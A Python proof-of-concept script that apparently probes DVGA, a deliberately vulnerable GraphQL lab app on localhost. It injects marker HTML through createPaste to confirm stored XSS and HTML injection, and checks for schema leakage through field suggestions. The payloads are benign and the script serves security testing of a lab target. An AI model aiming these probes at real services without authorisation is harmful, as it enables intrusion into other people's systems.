#!/usr/bin/env python3
"""DVGA manual red-team probes — GraphQL stored-XSS (#12) + field
suggestions (#8) — raw urllib, ZERO engine code. Proves the gaps live
before any engine work (RED-proven discipline)."""
import json, urllib.request, urllib.error, os, sys

URL = "http://127.0.0.1:5013/graphql"
MK = "GQLSTORED" + os.urandom(4).hex()[:8]

def gql(query, token=None, raw=False):
    req = urllib.request.Request(URL, data=json.dumps({"query": query}).encode(),
                                 headers={"Content-Type": "application/json"})
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode()

print("=== 1) STORED XSS via createPaste (write -> read roundtrip) ===")
r = gql('mutation { createPaste(title: "%s", content: "<b id=%s>stored-marker</b>", public: true) { paste { id title } } }' % (MK, MK))
print("createPaste:", r[:200])

r = gql('{ pastes(filter: "%s") { id title content } }' % MK)
print("read back  :", r[:400])
ok_stored = MK in r and "<b id=" in r
print("STORED-XSS ROUNDTRIP:", "PROVEN" if ok_stored else "NOT PROVEN")

print()
print("=== 2) FIELD SUGGESTIONS (typo field) ===")
r = gql('{ sentinelTypoField }')
print("typo reply:", r[:300])
ok_suggest = "Did you mean" in r or "did you mean" in r
print("FIELD SUGGESTIONS:", "PROVEN" if ok_suggest else "NOT PROVEN")

print()
print("=== 3) HTML injection shape (title, no script tag) ===")
r = gql('mutation { createPaste(title: "<i id=%s>t</i>", content: "plain", public: true) { paste { id title } } }' % MK)
print("create:", r[:160])
r = gql('{ pastes(filter: "<i id=%s>t</i>") { title content } }' % MK)
print("read  :", r[:300])
ok_html = MK in r
print("HTML-INJECTION ROUNDTRIP:", "PROVEN" if ok_html else "NOT PROVEN")

print()
print("SUMMARY: stored_xss=%s field_suggestions=%s html_injection=%s" % (ok_stored, ok_suggest, ok_html))
